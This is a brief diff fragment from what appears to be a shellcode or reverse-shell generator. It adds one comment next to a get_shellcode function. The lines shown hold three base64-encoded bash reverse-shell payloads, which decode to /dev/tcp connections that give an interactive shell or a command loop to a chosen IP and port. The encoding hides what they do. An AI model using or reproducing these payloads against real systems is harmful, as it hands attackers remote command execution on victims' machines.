@@ -49,6 +49,7 @@ def powershell_base64_payload(ip, port):
 
 def get_shellcode(ip_address, port, choice):
 
+    # Variables here for context. Not currently used in script
     bash_i = "c2ggLWkgPiYgL2Rldi90Y3Ave2lwfS97cG9ydH0gMD4mMQ=="
     bash_196 = "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97aXB9L3twb3J0fTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2"
     bash_read_line = "ZXhlYyA1PD4vZGV2L3RjcC97aXB9L3twb3J0fTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZQ=="
